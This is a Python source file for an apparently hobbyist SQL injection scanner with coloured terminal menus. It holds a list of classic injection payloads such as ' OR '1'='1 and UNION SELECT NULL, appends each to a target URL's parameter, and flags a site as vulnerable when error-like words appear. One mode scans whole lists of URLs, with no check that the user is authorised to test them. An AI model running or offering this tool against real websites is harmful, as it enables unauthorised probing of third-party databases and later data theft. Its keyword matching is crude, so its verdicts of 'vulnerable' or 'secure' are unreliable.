import requests
import time
from pystyle import Colors, Colorate, Write, System, Anime

class SQLiScanner:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 'a'='a",
            "admin' --",
            "' OR '1'='1' /*",
            "' OR 1=1 LIMIT 1 --"
        ]
    
    def display_header(self):
        System.Clear()
        title = """
╔══════════════════════════════════════════════════════╗
║            SQL INJECTION SCANNER v2.0                ║
╚══════════════════════════════════════════════════════╝
        """
        print(Colorate.Horizontal(Colors.red_to_yellow, title, 1))
    
    def scan_url(self, url):
        vulnerable = False
        found_payloads = []
        
        print(Colorate.Horizontal(Colors.cyan_to_blue, f"\n[+] Target: {url}", 1))
        print(Colorate.Horizontal(Colors.yellow_to_red, "─" * 60, 1))
        
        for i, payload in enumerate(self.payloads, 1):
            test_url = f"{url}{payload}"
            
            progress = Colorate.Horizontal(Colors.blue_to_purple, 
                                         f"[{i}/{len(self.payloads)}] Testing...", 1)
            print(f"\r{progress}", end="")
            
            try:
                response = requests.get(test_url, timeout=10, 
                                      headers={'User-Agent': 'Oxyl-SQLi-Scanner/1.0'})
                
                error_indicators = [
                    'sql', 'syntax', 'mysql', 'database', 'query',
                    'sqlite', 'postgresql', 'microsoft ole db'
                ]
                
                if any(indicator in response.text.lower() for indicator in error_indicators):
                    print()
                    Write.Print(f"  [✓] VULNERABLE: {payload[:40]}...", Colors.green_to_cyan, interval=0.01)
                    vulnerable = True
                    found_payloads.append(payload)
                
            except requests.exceptions.RequestException as e:
                print()
                Write.Print(f"  [!] Error: {str(e)[:30]}", Colors.red_to_yellow, interval=0.01)
            
            time.sleep(0.2)
        
        print("\n" + Colorate.Horizontal(Colors.red_to_yellow, "═" * 60, 1))
        return vulnerable, found_payloads
    
    def run(self):
        Anime.Fade(text=Colorate.Horizontal(Colors.red_to_yellow, "Starting SQLi Scanner...", 1), 
                  color=Colors.red_to_yellow, enter=True)
        
        while True:
            self.display_header()
            
            menu = """
╔══════════════════════════════════════════════════════╗
║ 1. Scan URL for SQL Injection                        ║
║ 2. Test Multiple URLs                                ║
║ 3. Back to Main Menu                                 ║
╚══════════════════════════════════════════════════════╝
            """
            print(Colorate.Horizontal(Colors.yellow_to_red, menu, 1))
            
            choice = Write.Input("\n[?] Select option -> ", Colors.red_to_yellow, interval=0.005)
            
            if choice == "1":
                url = Write.Input("\n[?] Enter URL (with ?param=) -> ", Colors.blue_to_purple, interval=0.005)
                
                if '=' not in url:
                    Write.Print("[!] URL must contain parameters (e.g., ?id=1)", Colors.red_to_purple, interval=0.01)
                else:
                    vulnerable, payloads = self.scan_url(url)
                    
                    if vulnerable:
                        print(Colorate.Horizontal(Colors.green_to_cyan, "\n[!] VULNERABILITY FOUND!", 1))
                        Write.Print(f"[+] Working payloads: {len(payloads)}", Colors.cyan_to_blue, interval=0.01)
                        
                        for p in payloads:
                            print(Colorate.Horizontal(Colors.yellow_to_green, f"  → {p}", 1))
                    else:
                        Write.Print("\n[✓] No SQLi vulnerabilities detected", Colors.blue_to_cyan, interval=0.01)
            
            elif choice == "2":
                file_path = Write.Input("\n[?] Enter file with URLs -> ", Colors.blue_to_purple, interval=0.005)
                
                try:
                    with open(file_path, 'r') as f:
                        urls = [line.strip() for line in f if line.strip()]
                    
                    vulnerable_sites = []
                    
                    for url in urls:
                        print(Colorate.Horizontal(Colors.cyan_to_blue, f"\nScanning: {url}", 1))
                        vulnerable, _ = self.scan_url(url)
                        
                        if vulnerable:
                            vulnerable_sites.append(url)
                            Write.Print("  [✗] VULNERABLE\n", Colors.red_to_yellow, interval=0.01)
                        else:
                            Write.Print("  [✓] SECURE\n", Colors.green_to_cyan, interval=0.01)
                    
                    print(Colorate.Horizontal(Colors.purple_to_blue, "\n" + "═" * 60, 1))
                    Write.Print(f"[+] Scan complete! Vulnerable: {len(vulnerable_sites)}/{len(urls)}", 
                               Colors.cyan_to_green, interval=0.01)
                    
                except FileNotFoundError:
                    Write.Print("[!] File not found!", Colors.red_to_purple, interval=0.01)
            
            elif choice == "3":
                Write.Print("\n[!] Returning to main menu...", Colors.yellow_to_red, interval=0.02)
                break
            
            else:
                Write.Print("\n[!] Invalid option!", Colors.red_to_purple, interval=0.01)
            
            input(Colorate.Horizontal(Colors.purple_to_blue, "\nPress Enter to continue...", 1))

def main():
    scanner = SQLiScanner()
    scanner.run()

if __name__ == "__main__":
    main()